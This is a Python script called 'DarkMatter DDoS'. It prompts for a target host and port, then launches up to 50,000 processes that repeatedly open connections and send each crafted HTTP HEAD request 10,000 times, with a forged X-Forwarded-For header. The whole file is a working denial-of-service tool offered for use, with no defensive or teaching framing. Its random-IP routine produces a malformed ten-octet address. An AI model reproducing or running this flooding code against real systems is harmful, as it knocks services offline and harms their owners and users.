import socket
import os, sys
import time
import multiprocessing, random

print("Welcome To DarkMatter DDoS")
ip = input("IP/Domain: ")
port = int(input("Port: "))

url = "https://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  randip9 = random.randint(1,255)
  randip10 = random.randint(1,255)

  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)
  randip.append(randip9)
  randip.append(randip10)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5]) + "." + str(randip[6]) + "." + str(randip[7]) + "." + str(randip[8]) + "." + str(randip[9])
  return(randip)

print("[>>>] Starting the attack [<<<]")


time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(10000):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(50000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

send2attack() #61 lines for the most powerful attack, cool?
